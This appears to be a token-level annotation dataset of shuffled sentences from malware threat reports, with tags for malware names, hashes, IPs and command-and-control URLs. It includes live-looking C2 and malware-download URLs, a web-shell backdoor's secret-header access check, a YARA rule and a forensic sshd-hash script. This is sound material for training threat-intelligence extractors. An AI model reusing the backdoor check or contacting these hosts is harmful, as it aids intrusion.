last	O
year	O
,	O
including	O
the	O
compromise	O
of	O
a	O
major	O
telecoms	O
services	O
provider	O
in	O
the	O
region	O
.	O

2016	O
.	O

CrowdStrike	O
assesses	O
that	O
the	O
observed	O
and	O
described	O
X-Agent	B-malware.infosteal
implant	O
targeting	O
Ukrainian	O
military	O
Android	O
devices	O
running	O
the	O
30.apk	B-malware.backdoor

01.01.2009	O
01.01.2009	O
Mrxnet.sys	O
17400	O
25.01.2010	O
Jmidebs.sys	O
25552	O
14.07.2010	O

In	O
this	O
version	O
:	O
The	O
authors	O
removed	O
the	O
familiar	O
XOR	O
key	O
used	O
by	O
Agent.BTZ	B-malware.backdoor
and	O
Uroburos	B-malware.backdoor
.	O

Extracts	O
Extracts	O

(	O
This	O
blog	O
is	O
continued	O
on	O
the	O
next	O
page	O
)	O
Pages	O
:	O
Page	O
1	O
,	O
Page	O
2	O
,	O
Page	O
3	O

The	O
method	O
used	O
to	O
install	O
the	O
service	O
is	O
highly	O
effective	O
.	O

We	O
identified	O
36	O
active	O
FinSpy	B-malware.backdoor
command	O
&	O
control	O
servers	O
,	O
including	O
30	O
previously-unknown	O
servers	O
.	O

T	O
he	O
log	O
is	O
encrypted	O
and	O
is	O
located	O
at	O
/var/tmp/.pipe.sock	O
.	O

The	O
following	O
password-protected	O
document	O

Full	O
Domain	O
List	O
:	O

Cybereason	O
is	O
the	O
leader	O
in	O
endpoint	O
protection	O
,	O
offering	O
endpoint	O
detection	O
and	O
response	O
,	O
next-generation	O
antivirus	O
,	O
and	O
active	O
monitoring	O
services	O
.	O

Either	O
way	O
,	O
the	O
group	O
's	O
consistent	O
activity	O
throughout	O
central	O
and	O
eastern	O
asia	O
seems	O
to	O
be	O
poorly	O
represented	O
in	O
the	O
public	O
discussion	O
.	O

Breach	O
discovered	O
and	O
ransomware	O
uploaded	O
to	O
online	O
malware	O
repository	O
site	O
.	O

User	O
Credential	O
Theft	O

ToString	O
(	O
)	O
)	O
;	O
private	O
bool	O
IsUserValid	O
(	O
)	O
if	O
(	O
Request.Headers	O
[	O
'	O
Keep-Alive	O
'	O
]	O
==	O
'	O
320	O
'	O
)	O
return	O
true	O
;	O
if	O
(	O
Request.UserLanguages.Length	O
>	O
0	O
)	O
foreach	O
(	O
string	O
s	O
in	O
Request.UserLanguages	O
)	O
if	O
(	O
s.IndexOf	O
(	O
'	O
es-DN	O
'	O
)	O
>	O
=	O
0	O
)	O
return	O
true	O
;	O
catch	O
(	O
Exception	O
)	O
return	O
false	O
;	O

While	O
the	O
continued	O
vector	O
of	O
the	O
attack	O
remains	O
unclear	O
,	O
root9B	O
assesses	O
that	O
it	O
will	O
most	O
likely	O
be	O
a	O
spear-phishing	O
campaign	O
.	O

This	O
combination	O
is	O
likely	O
to	O
be	O
more	O
common	O
among	O
nation-state	O
actors	O
.	O

McAfee	O
Policy	O
Auditor	O
SCAP	O
MNAC	O
SCAP	O

Since	O
2014	O
,	O
Inception	B-malware.backdoor
has	O
widened	O
its	O
use	O
of	O
cloud	O
service	O
providers	O
for	O
C	O
&	O
C	O
purposes	O
.	O

Here	O
is	O
an	O
example	O
:	O

Through	O
working	O
with	O
trusted	O
partners	O
,	O
we	O
have	O
been	O
able	O
to	O
get	O
insight	O
into	O
the	O
transactions	O
made	O
as	O
part	O
of	O
the	O
heist	O
.	O

First	O
,	O
it	O
generates	O
one	O
random	O
byte	O
,	O
followed	O
by	O
three	O
zero	O
bytes	O
,	O
one	O
random	O
byte	O
,	O
and	O
finally	O
,	O
the	O
byte	O
with	O
the	O
length	O
of	O
the	O
string	O
.	O

It	O
contains	O
resource	O
strings	O
in	O
English	O
but	O
the	O
language	O
is	O
set	O
to	O
Chinese	O
as	O
shown	O
below	O
.	O

This	O
choice	O
of	O
font	O
seems	O
a	O
bit	O
odd	O
since	O
it	O
does	O
not	O
support	O
a	O
lot	O
of	O
East-Asian	O
languages	O
.	O

List	O
of	O
all	O
window	O
titles	O
.	O

Khan	O
also	O
likely	O
maintains	O
a	O
close	O
relationship	O
to	O
the	O
Pakistani	O
government	O
.	O

This	O
reflects	O
the	O
Poseidon	B-malware.infosteal
Group	O
's	O
familiarity	O
with	O
Windows	O
network	O
administration	O
.	O

The	O
analyzed	O
sample	O
of	O
Babar	B-malware.drop
has	O
two	O
hard	O
coded	O
C	O
&	O
C	O
server	O
addresses	O
which	O
are	O
included	O
in	O
its	O
configuration	O
data	O
:	O
http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php	B-url.cncsvr
http://www.gezelimmi.com/wp-includes/misc/bb/index.php	B-url.cncsvr
Both	O
servers	O
were	O
used	O
to	O
push	O
spied	O
information	O
onto	O
the	O
remote	O
site	O
.	O

Delivery	O
Documents	O
Installing	O
Cmstar	B-malware.unknown

The	O
following	O
table	O
illustrates	O
the	O
hard	O
coded	O
dates	O
in	O
relation	O
to	O
the	O
affected	O
files	O
'	O
PE	O
dates	O
:	O
21	O
Jun	O
2013	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
date	O
)	O
netsat.exe	O
29	O
Mar	O
2013	O
netui3.dll	B-malware.backdoor
27	O
Mar	O
2013	O
31	O
May	O
2013	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
date	O
)	O
winmgt.dll	B-malware.backdoor
14	O
Dec	O
2012	O
30	O
Dec	O
2012	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
date	O
)	O
The	O
following	O
version	O
information	O
was	O
recorded	O
in	O
the	O
netsat.exe	B-malware.infosteal
executable	O
:	O

The	O
code	O
responsible	O
for	O
retrieving	O
the	O
value	O
associated	O
with	O
a	O
key	O
is	O
shown	O
in	O
Figure	O
1	O
.	O

Once	O
again	O
,	O
OceanLotus	O
shows	O
that	O
the	O
team	O
is	O
active	O
and	O
continues	O
to	O
update	O
its	O
toolset	O
.	O

Free	O
web	O
hosting	O
sites	O
,	O
on	O
the	O
other	O
hand	O
,	O
require	O
little	O
or	O
no	O
registration	O
information	O
.	O

androidminer	O
:	O
Holds	O
the	O
cpuminer	O
command	O
line	O
to	O
execute	O
for	O
unknown	O
malicious	O
android	O
applications	O
,	O
at	O
the	O
time	O
of	O
writing	O
this	O
post	O
,	O
this	O
paste	O
received	O
nearly	O
2000	O
hits	O
.	O

Since	O
the	O
release	O
of	O
the	O
Arbor	O
blog	O
post	O
,	O
FireEye	O
has	O
observed	O
APT12	O
use	O
a	O
modified	O
RIPTIDE	B-malware.backdoor
backdoor	O
that	O
we	O
call	O
HIGHTIDE	B-malware.backdoor
.	O

now	O
:	O
5523F78E	O
QWORD	O

The	O
name	O
of	O
the	O
encrypted	O
configuration	O
file	O
on	O
disk	O
has	O
been	O
racss.dat	O
in	O
all	O
of	O
the	O
observed	O
cases	O
.	O

The	O
contents	O
of	O
the	O
process	O
's	O
memory	O
are	O
then	O
saved	O
onto	O
the	O
system	O
's	O
hard	O
drive	O
as	O
.	O

A	O
much	O
larger	O
collection	O
of	O
information	O
is	O
available	O
to	O
trusted	O
and	O
interested	O
parties	O
.	O

BTRESULTSyn	O
Flood	O
|	O
Syn	O
task	O
finished	O
!	O

The	O
malware	O
connects	O
via	O
HTTP	O
GET	O
and	O
POST	O
requests	O
to	O

If	O
the	O
CPU	O
core	O
check	O
detects	O
more	O
than	O
one	O
core	O
,	O
it	O
implants	O

Note	O
that	O
some	O
of	O
the	O
texts	O
contain	O
mistakes	O
:	O
We	O
suppose	O
that	O
the	O
Kraken	B-malware.ransom
botnet	B-malware.ransom
was	O
developed	O
by	O
a	O
beginner	O
.	O

843c17b06a3aee22447f021307909890b68828b9	O
(	O
February	O
25	O
)	O
343ebca579bb888eb8ccb811f9b52280c72e484c	O
(	O
February	O
25	O

checkBackupIosDeviceFolder	O
]	O

안다리엘	O
그룹은	O
다양한	O
공격	O
기법을	O
사용하고	O
있으며	O
,	O
특히	O
한국의	O
소프트웨어	O
취약점을	O
주로	O
이용한다	O
.	O

Malware	O
was	O
also	O
hosted	O
in	O
legitimate	O
breached	O
Israeli	O
websites	O
,	O
such	O
as	O
this	O
educational	O
website	O
:	O
http://www.bagrut3.org[.]il/upload/edu_shlishit/passwordlist.exe	B-url.unknown
(	O
defc340825cf56f18b5ba688e6695e68	B-hash
)	O
and	O
a	O
small	O
law	O
firm	O
's	O
website	O
:	O
http://sheinin[.]co.il/MyPhoto.zip	B-url.unknown
(	O
650fcd25a917b37485c48616f6e17712	B-hash
)	O

This	O
is	O
the	O
default	O
field	O
displayed	O
to	O
users	O
,	O
so	O
to	O
the	O
untrained	O
eye	O
it	O
easily	O
blends	O
in—especially	O
with	O
many	O
files	O
in	O
the	O
directory	O
.	O

The	O
ability	O
to	O
download	O
most	O
of	O
these	O
for	O
free	O
on	O
certain	O
underground	O
hacking	O
forums	O
decreases	O
the	O
cost	O
of	O
attack	O
without	O
compromising	O
on	O
stealth	O
or	O
effectiveness	O
.	O

Command	O
Structure	O
The	O
command	O
request	O
to	O
the	O
C	O
&	O
C	O
server	O
is	O
made	O
via	O
HTTP	O
GET	O
.	O

Two	O
different	O
versions	O
of	O
the	O
same	O
backdoor	O
were	O
used	O
in	O
all	O
of	O
these	O
attacks	O
.	O

This	O
will	O
then	O
result	O
in	O
more	O
readable	O
PowerShell	O
scripts	O
capable	O
of	O
dropping	O
various	O
components	O
in	O
the	O
%	O
Application	O
Data	O
%	O
\Microsoft\CLR\*	O
directory	O
.	O

The	O
'	O
DBC_BANK_IMG_23456_156.jar	B-malware.infosteal
'	O
malware	O
is	O
a	O
corrupted	O
file	O
,	O
but	O
it	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

Subscribe	O
Products	O
Solutions	O
Mandiant	O
Consulting	O
Current	O
Threats	O
Partners	O
Support	O
Company	O

Attackers	O
send	O
links	O
to	O
victims	O
using	O
a	O
similar	O
technique	O
to	O
that	O
described	O
in	O
our	O
Sofacy	O
phishing	O
blog	O
,	O
where	O
multiple	O
redirects	O
are	O
deployed	O
,	O
one	O
being	O
a	O
decoy	O
,	O
the	O
other	O
in	O
this	O
case	O
loading	O
ScanBox	B-malware.infosteal
:	O

The	O
analysts	O
at	O
root9B	O
understand	O
better	O
than	O
anyone	O
the	O
significance	O
of	O
this	O
analysis	O
.	O

Bot	O
ServerID	O
Interestingly	O
,	O
there	O
's	O
a	O
private	O
IP	O
address	O
10.1.0.105	B-ip.unknown
in	O
the	O
code	O
that	O
may	O
have	O
been	O
used	O
as	O
a	O
test	O
C	O
&	O
C	O
server	O
.	O

برقعلا	O
نجس	O
يف	O
ليعامسإ	O
ديرف	O
يدايقلا	O
تومل	O
ةيقيقحلا	O
ةصقلا	O

This	O
larger	O
file	O
is	O
a	O
backdoor/downloader	O
that	O
includes	O
ssh	O
functionality	O
,	O
and	O
drops	O
its	O
keys	O
to	O
disk	O
for	O
ssh	O
interaction	O
.	O

an	O
embedded	O
configuration	O
to	O
the	O
external	O
XML-formatted	O
configuration	O
file	O
seen	O
today	O
.	O

These	O
documents	O
contained	O
malicious	O
macros	O
that	O
created	O
persistence	O
on	O
the	O
compromised	O
machine	O
using	O
two	O
scheduled	O
tasks	O
,	O
whose	O
purpose	O
was	O
to	O
download	O
secondary	O
payloads	O
(	O
mainly	O
Cobalt	O
Strike	O
Beacon	O
)	O
:	O

Remote	O
loading	O
of	O
the	O
embedded	O
Flash	O
object	O
has	O
multiple	O
significant	O
advantages	O
:	O
Evasion	O
:	O
The	O
document	O
by	O
itself	O
does	O
not	O
contain	O
any	O
malicious	O
code	O
.	O

The	O
Cybersecurity	O
Information	O
Sharing	O
and	O
Collaboration	O
Program	O
(	O
CISCP	O
)	O
is	O
a	O
voluntary	O
information-sharing	O
and	O
collaboration	O
program	O
between	O
and	O
among	O
critical	O
infrastructure	O
partners	O
and	O
the	O
Federal	O
Government	O
.	O

First	O
,	O
it	O
checks	O
if	O
the	O
DLL	O
is	O
executed	O
as	O
a	O
service	O
.	O

This	O
'	O
internet_explorer_Smart_recovery.exe	O
'	O
054471f7e168e016c565412227acfe7f	O
,	O
and	O
a	O
hidden	O
browser	O
window	O
phoning	O
back	O
to	O
its	O
c2	O
.	O

Based	O
on	O
available	O
analysis	O
results	O
,	O
netsat.exe	B-malware.infosteal
could	O
collect	O
surreptitiously	O
gathered	O
data	O
from	O
any	O
infected	O
drive	O
connected	O
to	O
the	O
system	O
whereon	O
netsat.exe	B-malware.infosteal
was	O
running	O
,	O
e.g.	O
,	O
the	O
infected	O
drive	O
would	O
not	O
have	O
to	O
be	O
processed	O
by	O
the	O
same	O
system	O
whereon	O
it	O
became	O
infected	O
.	O

These	O
other	O
versions	O
have	O
been	O
observed	O
to	O
use	O
the	O
following	O
DWORDs	O
:	O

Advanced	O
Malware	O
Protection	O
(	O
AMP	O
)	O
is	O
ideally	O
suited	O
to	O
prevent	O
the	O
execution	O
of	O
the	O
malware	O
used	O
by	O
these	O
threat	O
actors	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
network	O
traffic	O
making	O
the	O
POST	O
request	O
to	O
Uninstaller.php	O
and	O
the	O
returned	O
response	O
.	O

The	O
message	O
was	O
sent	O
from	O
a	O
Post x	O
email	O
server	O
and	O
originated	O
from	O
the	O
hostname	O
ospf1-apac-sg.stickyadstv.com	B-url.unknown
.	O

January	O
15	O
,	O
2014	O
Document	O
Status	O
:	O
FINAL	O
Last	O
Revised	O
:	O
2014-­‐01-­‐15	O
The	O
General	O
Dynamics	O
Fidelis	O
Cybersecurity	O
forensics	O
team	O
analyzed	O
several	O
related	O
malware	O
samples	O
that	O
together	O
provide	O
a	O
sophisticated	O
mechanism	O
to	O
gather	O
data	O
from	O
individual	O
computer	O
systems	O
.	O

Significantly	O
,	O
malware	O
objects	O
seen	O
in	O
previous	O
campaigns	O
like	O
DarkComet	B-malware.backdoor
and	O
ArcomRAT	B-malware.backdoor
8	O
have	O
also	O
been	O
observed	O
beaconing	O
to	O
the	O
same	O
CnC	O
servers	O
Unrecom	B-malware.backdoor
RAT	B-malware.backdoor
is	O
currently	O
using	O
.	O

downloadFileFromPath	O

The	O
Zebrocy	B-malware.backdoor
chain	O
follows	O
a	O
pattern	O
:	O
spearphish	O
attachment	O
-	O
>	O
compiled	O
Autoit	O
script	O
(	O
downloader	O
)	O
-	O
>	O
Zebrocy	B-malware.backdoor
payload	O
.	O

This	O
takes	O
the	O
filename	O
'	O
RSWXXXX.tmp	B-malware.unknown
'	O
,	O
where	O
'	O
XXXX	O
'	O
is	O
randomly	O
generated	O
through	O
the	O
GetTempFileName	O
function	O
.	O

The	O
Islamic	O
Republic	O
operates	O
with	O
embedded	O
paranoia	O
,	O
where	O
ultimately	O
,	O
no	O
one	O
can	O
be	O
trusted	O
.	O

유사한	O
악성코드로	O
다양한	O
목표를	O
공격했으며	O
,	O
일부	O
악성코드는	O
동일한	O
C2를	O
사용했다	O
.	O

The	O
CopyKittens	B-malware.backdoor
group	O
has	O
implemented	O
this	O
routine	O
by	O
using	O
WTSEnumerateProcess	O
API	O
to	O
get	O
a	O
list	O
of	O
current	O
active	O
processes	O
and	O
then	O
trying	O
to	O
get	O
a	O
handle	O
to	O
each	O
process	O
via	O
OpenProces	O
API	O
,	O
avoiding	O
x64	O
processes	O
.	O

The	O
vulnerability	O
(	O
CVE-2018-5002	B-malware.drop
)	O
allows	O
for	O
a	O
maliciously	O
crafted	O
Flash	O
object	O
to	O
execute	O
code	O
on	O
victim	O
computers	O
,	O
which	O
enables	O
an	O
attacker	O
to	O
execute	O
a	O
range	O
of	O
payloads	O
and	O
actions	O
.	O

The	O
investigation	O
found	O
that	O
the	O
SIS	O
controllers	O
initiated	O
a	O
safe	O
shutdown	O
when	O
application	O
code	O
between	O
redundant	O
processing	O
units	O
failed	O
a	O
validation	O
check	O
--	O
resulting	O
in	O
an	O
MP	O
diagnostic	O
failure	O
message	O
.	O

Among	O
the	O
apparent	O
targets	O
of	O
other	O
domains	O
similarly	O
created	O
or	O
updated	O
in	O
2015	O
are	O
:	O
the	O
United	O
Nations	O
,	O
United	O
Nations	O
Children	O
's	O
Fund	O
,	O
United	O
Bank	O
for	O
Africa	O
,	O
Regions	O
Bank	O
,	O
and	O
possibly	O
Commerzbank	O
.	O

Those	O
commands	O
serve	O
as	O
a	O
reconnaissance	O
step	O
for	O
the	O
operators	O
.	O

This	O
suggests	O
the	O
attacker	O
was	O
intent	O
on	O
causing	O
a	O
specific	O
outcome	O
beyond	O
a	O
process	O
shutdown	O
.	O

During	O
the	O
analysis	O
,	O
we	O
found	O
the	O
decryption	O
algorithm	O
that	O
malware	O
used	O
is	O
identical	O
to	O
APT-C-06	O
's	O
decryption	O
algorithm	O
.	O

The	O
following	O
sections	O
describe	O
the	O
two	O
methods	O
in	O
further	O
detail	O
.	O

//	O
10003621	O
$	O
=	O
{	O
66	O
[	O
4-7	O
]	O
20	O
40	O
83	O
f8	O
1a	O
7c	O
?	O
?	O
}	O

/usr/share/python2.7	O
/sma.php	O
/usr/share/python2.7	O
/theme.php	O
/root/theme.php	O
/usr/lib/libng/media.php	O
/var/tmp/.pipe.sock	O
f3e3e25a822012023c6e81b2067	B-hash
11865	I-hash
c7	B-hash
647	I-hash
0e85b7	I-hash
f3da46539b40e5c5527	I-hash
12	I-hash
155385cc19e30927	B-hash
65bcfed034b82ccb	I-hash
1644af9b6424e8f58f39c7	B-hash
fa5e7	I-hash
6de51	I-hash
2292f5db385068e161ae27	B-hash
7	I-hash
531b2e114	I-hash
7	B-hash
ec514bbdc6dd8f606f803d39af8883f	I-hash
7	B-hash
8c31eff38fdb7	I-hash
2ea3b1800ea917	I-hash
940f	I-hash
rule	O
Backdoored_	O
ssh	O
{	O
strings	O
:	O
$	O
a1	O
=	O
'	O
OpenSSH	O
'	O
$	O
a2	O
=	O
'	O
usage	O
:	O
ssh	O
'	O
$	O
a3	O
=	O
'	O
HIST	O
FILE	O
'	O
condition	O
:	O
uint32	O
(	O
0	O
)	O
==	O
0x464c457	O
f	O
and	O
filesize	O
<	O
1000000	O
and	O
all	O
of	O
(	O
$	O
a*	O
)	O
cd	O
/tmp	O
workdir=428c5fcf495396df04a459e317	O
b7	O
0ca2	O
mkdir	O
$	O
workdir	O
cd	O
$	O
workdir	O
find	O
/	O
-type	O
d	O
-iname	O
smbtrap	O
>	O
find-smbtrap.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
dirsearch	O
>	O
find-dirsearch.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
nmap	O
>	O
find-nmap.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
wpscan	O
>	O
find-wpscan.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
sublist3r	O
>	O
find-sublist3r.txt	O
2	O
>	O
/dev/null	O
dpkg	O
-l	O
|	O
grep	O
-E	O
\	O
(	O
impacket\	O
|	O
pcapy\	O
|	O
nmap\	O
)	O
>	O
dpkg-grep.txt	O
cp	O
/var/lib/dpkg/info/openssh-server.md5sums.#retrieve	O
initial	O
hash	O
for	O
sshd	O
md5sum	O
/usr/sbin/sshd	O
>	O
sshd.md5sum	O
#	O
calculate	O
actual	O
hash	O
for	O
sshd	O
cd	O
/tmp	O
workdir=428c5fcf495396df04a459e317	O
b7	O
0ca2	O
mkdir	O
$	O
workdir	O
cd	O
$	O
workdir	O
find	O
/	O
-type	O
d	O
-iname	O
smbtrap	O
>	O
find-smbtrap.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
dirsearch	O
>	O
find-dirsearch.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
nmap	O
>	O
find-nmap.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
wpscan	O
>	O
find-wpscan.txt	O
2	O
>	O
/dev/null	O
find	O
/	O
-type	O
d	O
-iname	O
sublist3r	O
>	O
find-sublist3r.txt	O
2	O
>	O
/dev/null	O
rpm	O
-qa	O
|	O
grep	O
-E	O
\	O
(	O
impacket\	O
|	O
pcapy\	O
|	O
nmap\	O
)	O
>	O
rpm-grep.txt	O
rpm	O
-qa	O
–dump	O
|	O
grep	O
ssh	O
>	O
rpm-qa-dump.txt	O
#	O
retrieve	O
initial	O
hash	O
for	O
sshd	O
sha256sum	O
/usr/sbin/sshd	O
>	O
sshd.sha256sum	O
#	O
calculate	O
actual	O
sha256	O
hash	O
for	O
sshd	O
md5sum	O
/usr/sbin/sshd	O
>	O
sshd.md5sum	O
#	O
calculate	O
actual	O
md5	O
hash	O
for	O
sshd	O

This	O
continues	O
the	O
theme	O
of	O
FinSpy	B-malware.backdoor
deployments	O
with	O
strong	O
indications	O
of	O
politically-motivated	O
targeting	O
.	O

When	O
it	O
calls	O
to	O
decode	O
an	O
encoded	O
string	O
,	O
it	O
will	O
use	O
the	O
local	O
stack	O
variable	O
to	O
save	O
the	O
decoded	O
string	O
.	O

Next	O
,	O
the	O
Trojan	O
searches	O
for	O
several	O
folders	O
in	O
the	O
Program	O
Files	O
directories	O
,	O
including	O
:	O
C	O
:	O
\\Program	O
Files\\AVG	O
C	O
:	O
\\Program	O
Files\\AVAST	O
Software	O
C	O
:	O
\\Program	O
Files\\Diebold\\Warsaw	O
C	O
:	O
\\Program	O
Files\\Trusteer\\Rapport	O
C	O
:	O
\\Program	O
Files\\Java	O
C	O
:	O
\\Program	O
Files	O
(	O
x86	O
)	O
\\scpbrad	O
If	O
any	O
of	O
the	O
folders	O
are	O
found	O
,	O
this	O
information	O
,	O
along	O
with	O
the	O
hostname	O
and	O
Operating	O
System	O
version	O
,	O
is	O
sent	O
to	O
a	O
hardcoded	O
domain	O
with	O
the	O
hardcoded	O
User-Agent	O
value	O
System	O
version	O
,	O
is	O
sent	O
to	O
a	O
hardcoded	O
domain	O
with	O
the	O
hardcoded	O
User-Agent	O
value	O
'	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
rv:12.0	O
)	O
Gecko/20100101	O
Firefox/12.0	O
'	O
in	O
the	O
format	O
shown	O
in	O
Figure	O
11	O
.	O

With	O
these	O
credentials	O
,	O
the	O
malware	O
started	O
to	O
spread	O
inside	O
its	O
host	O
network	O
using	O
SysInternals	O
'	O
PsExec	O
utility	O
.	O

Code	O
snapshot	O

Details	O
associated	O
with	O
this	O
threat	O
have	O
been	O
shared	O
with	O
the	O
ThreatConnect	O
Community	O
within	O
Incident	O
'	O
'	O
.	O

Figure	O
3	O
.	O

It	O
provides	O
the	O
following	O
capabilities	O
:	O
Enumerate	O
attached	O
drives	O
Utilize	O
built	O
in	O
SQL	O
functions	O
to	O
connect	O
to	O
database	O
backend	O
Run	O
SQL	O
queries	O
and	O
statements	O
Download	O
,	O
upload	O
and	O
read	O
files	O
Directory	O
listing	O
Execute	O
Active	O
Directory	O
requests	O
Compile	O
and	O
execute	O
arbitrary	O
C	O
#	O
source	O
code	O
Impersonate	O
a	O
user	O
The	O
web	O
shell	O
supports	O
8	O
main	O
commands	O
,	O
with	O
most	O
command	O
execution	O
via	O
Transact-SQL	O
using	O
the	O
xp_cmdshell	O
function	O
.	O

When	O
this	O
malicious	O
DLL	O
is	O
executed	O
the	O
Victim	O
system	O
establishes	O
a	O
secure	O
and	O
encrypted	O
connection	O
on	O
port	O
443	O
and	O
beacons	O
with	O
the	O
following	O
request	O
(	O
encryption	O
layer	O
removed	O
)	O
.	O

Aside	O
from	O
a	O
suite	O
of	O
advanced	O
modular	O
malware	O
,	O
the	O
group	O
is	O
notable	O
for	O
its	O
ability	O
to	O
make	O
use	O
of	O
new	O
platforms	O
such	O
as	O
the	O
cloud	O
,	O
IoT	O
,	O
and	O
mobile	O
to	O
facilitate	O
its	O
attacks	O
.	O

The	O
decoded	O
payload	O
is	O
a	O
shellcode	O
,	O
whose	O
purpose	O
is	O
to	O
retrieve	O
a	O
Cobalt	O
Strike	O
Beacon	O
from	O
the	O
C	O
&	O
C	O
server	O
:	O

The	O
RATANKBA	B-malware.backdoor
malware	O
has	O
a	O
control	O
model	O
that	O
does	O
not	O
use	O
real-time	O
communication	O
between	O
the	O
backdoor	O
and	O
the	O
attacker	O
.	O

Figure	O
9	O
:	O
Lure	O
document	O
in	O
Arabic	O
purporting	O
to	O
show	O
salary	O
modifications	O
Within	O
the	O
document	O
,	O
the	O
threat	O
actor	O
utilizes	O
the	O
domain	O
'	O
dohabayt[.]com	B-url.cncsvr
'	O
for	O
malicious	O
content	O
which	O
also	O
reveals	O
additional	O
clues	O
as	O
to	O
the	O
intended	O
target	O
.	O

File	O
Name	O
:	O
US$25k.jar	B-malware.infosteal
File	O
Size	O
:	O
43853	O
bytes	O
MD5	O
:	O
ccfbc03a5beb1adb66f058b1f5a84d98	B-hash
SHA1	O
:	O
cfd0a4d6535f6323e4423bbd07027d294887ea25	B-hash

중앙관리	O
솔루션의	O
클라이언트	O
에이전트는	O
관리	O
서버에서	O
전송된	O
파일을	O
수신하여	O
실행하는	O
역할을	O
한다	O
.	O

Figure	O
9	O
:	O
Excessive	O
use	O
of	O
encoded	O
strings	O

This	O
time	O
the	O
VBS	B-malware.backdoor
backdoor	O
used	O
the	O
C	O
&	O
C	O
server	O
at	O
130.185.250[.]171	B-ip.unknown
.	O

If	O
the	O
controller	O
did	O
not	O
recover	O
within	O
a	O
defined	O
time	O
window	O
,	O
this	O
sample	O
would	O
overwrite	O
the	O
malicious	O
program	O
with	O
invalid	O
data	O
to	O
cover	O
its	O
tracks	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

For	O
example	O
,	O
we	O
have	O
an	O
encoded	O
string	O
at	O
address	O
0x013C992C	O
.	O

Despite	O
a	O
nearly	O
identical	O
delivery	O
mechanism	O
(	O
with	O
the	O
exception	O
of	O
altered	O
4-byte	O
XOR	O
keys	O
)	O
,	O
the	O
payloads	O
(	O
when	O
recoverable	O
)	O
were	O
different	O
in	O
each	O
case	O
.	O

<	O
|	O
dellLemb	O
|	O
>	O
deletes	O
the	O
registry	O
key	O
\Software\Microsoft\Internet	O
Explorer\notes	O
.	O

Cobalt	O
Strike1.48	O
Adding	O
timestomp	O
command	O
to	O
Beacon	O
;	O
the	O
waiting	O
time	O
of	O
copying	O
bypassuac	O
privilege	O
files	O
Cobalt	O
Strike1.49	O
Fixed	O
Beacon	O
HTTP	O
Stager	O
payload	O
generator	O
of	O
Windows	O
XP	O
.	O

Rather	O
than	O
including	O
a	O
list	O
of	O
strings	O
of	O
associated	O
processes	O
,	O
Cmstar	O
enumerates	O
the	O
running	O
processes	O
and	O
subjects	O
these	O
process	O
names	O
to	O
a	O
hashing	O
algorithm	O
.	O

Application	O
Whitelisting	O
:	O
Do	O
we	O
allow	O
only	O
approved	O
programs	O
to	O
run	O
on	O
our	O
networks	O
?	O

Usage	O
of	O
a	O
legitimate	O
website/server	O
in	O
the	O
target	O
nation/region	O
for	O
launching	O
attacks	O
is	O
a	O
common	O
tactic	O
used	O
to	O
minimize	O
detection	O
.	O

2.1	O
Limitations	O
.......................................	O
2.2	O
Sharing	O
.........................................	O

According	O
to	O
Kaspersky	O
,	O
the	O
latter	O
data	O
wiping	O
operation	O
targeted	O
sectors	O
across	O
Saudi	O
Arabia	O
and	O
Europe	O
.	O

The	O
above	O
figure	O
shows	O
a	O
piece	O
of	O
decompiled	O
code	O
of	O
the	O
AutoIt	O
script	O
,	O
where	O
the	O
IP	O
address	O
and	O
the	O
path	O
,	O
with	O
relative	O
user	O
agent	O
are	O
masqueraded	O
in	O
hexadecimal	O
encoding	O
.	O

Our	O
products	O
detect	O
it	O
as	O
well	O
as	O
other	O
malware	O
from	O
ScarCruft	B-malware.infosteal
as	O
Although	O
our	O
visibility	O
is	O
rather	O
limited	O
,	O
some	O
of	O
the	O
victims	O
of	O
these	O
attacks	O
include	O
:	O
A	O
law	O
enforcement	O
agency	O
in	O
an	O
Asian	O
country	O
One	O
of	O
the	O
largest	O
trading	O
companies	O
in	O
Asia	O
and	O
in	O
the	O
world	O
A	O
mobile	O
advertising	O
and	O
app	O
monetization	O
company	O
in	O
the	O
USA	O
Individuals	O
related	O
to	O
the	O
International	O
Association	O
of	O
Athletics	O
Federations	O
A	O
restaurant	O
located	O
in	O
one	O
of	O
the	O
top	O
malls	O
in	O
Dubai	O
Some	O
of	O
these	O
were	O
compromised	O
over	O
the	O
last	O
few	O
days	O
,	O
indicating	O
the	O
attackers	O
are	O
still	O
very	O
active	O
.	O

Figure	O
10	O
:	O
Decoded	O
SCT	O
contents	O
A	O
quick	O
conversion	O
of	O
the	O
contents	O
of	O
the	O
variable	O
'	O
$	O
var_code	O
'	O
from	O
Base64	O
to	O
ASCII	O
shows	O
some	O
familiar	O
network	O
indicators	O
,	O
shown	O
in	O
Figure	O
11	O
.	O

reducing	O
the	O
data	O
through	O
clustering	O
,	O
even	O
samples	O
that	O
avoid	O
initial	O
sandbox	O
detection	O
can	O
potentially	O
be	O
detected	O
as	O
malicious	O
.	O

Finally	O
,	O
the	O
resulting	O
base64	O
decoded	O
binary	O
string	O
is	O
fed	O
through	O
another	O
XOR	O
(	O
0xAB	O
)	O
,	O
resulting	O
in	O
clear-text	O
.	O

The	O
malicious	O
code	O
inserted	O
into	O
these	O
apps	O
is	O
capable	O
of	O
collecting	O
and	O
exfiltrating	O
information	O
from	O
the	O
device	O
,	O
such	O
as	O
the	O
phone	O
number	O
,	O
serial	O
number	O
,	O
location	O
,	O
contacts	O
,	O
user	O
's	O
photos	O
,	O
SMS	O
and	O
Telegram	O
and	O
WhatsApp	O
chat	O
messages	O
.	O

